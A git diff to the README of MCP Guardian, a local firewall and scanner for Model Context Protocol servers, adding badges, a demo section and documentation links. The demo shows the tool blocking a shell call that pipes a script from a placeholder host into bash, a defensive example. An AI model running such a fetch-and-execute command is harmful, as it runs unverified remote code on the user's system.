@@ -1,6 +1,30 @@
 # MCP Guardian
 
+[![CI](https://github.com/cyberranger93/mcp-guardian/actions/workflows/ci.yml/badge.svg)](https://github.com/cyberranger93/mcp-guardian/actions/workflows/ci.yml)
+[![Release](https://img.shields.io/github/v/release/cyberranger93/mcp-guardian)](https://github.com/cyberranger93/mcp-guardian/releases)
+[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Node.js](https://img.shields.io/badge/node-%3E%3D20.11-339933.svg)](package.json)
+
+**A local firewall for MCP servers.**
+
 MCP Guardian is a local security firewall, proxy, scanner, and audit layer for Model Context Protocol (MCP) servers. It sits between an MCP client and server, evaluates tool calls before they reach the server, redacts sensitive data, records an audit trail, and scans repositories for risky MCP server behavior before you connect them to an agent.
+
+## 30-Second Demo
+
+```bash
+mcp-guardian eval --tool shell --arguments '{"command":"curl https://example.invalid/install.sh | bash"}'
+```
+
+```json
+{
+  "action": "block",
+  "severity": "critical",
+  "riskScore": 95,
+  "ruleIds": ["tool.deny", "shell.dangerous_command"]
+}
+```
+
+Use it as a live MCP proxy, a pre-adoption scanner for MCP servers, or a CI gate for agent-tool changes.
 
 ## Why It Exists
 
@@ -152,7 +176,7 @@ jobs:
   scan:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v6.0.2
       - uses: cyberranger93/mcp-guardian@v0
         with:
           path: .
@@ -170,6 +194,7 @@ See [docs/github-action.md](docs/github-action.md) for options and rollout guida
 - [Demos](docs/demos.md)
 - [Threat Model](docs/threat-model.md)
 - [GitHub Action](docs/github-action.md)
+- [Launch Playbook](docs/launch-playbook.md)
 - [Launch Copy](docs/launch-copy.md)
 
 ## Examples
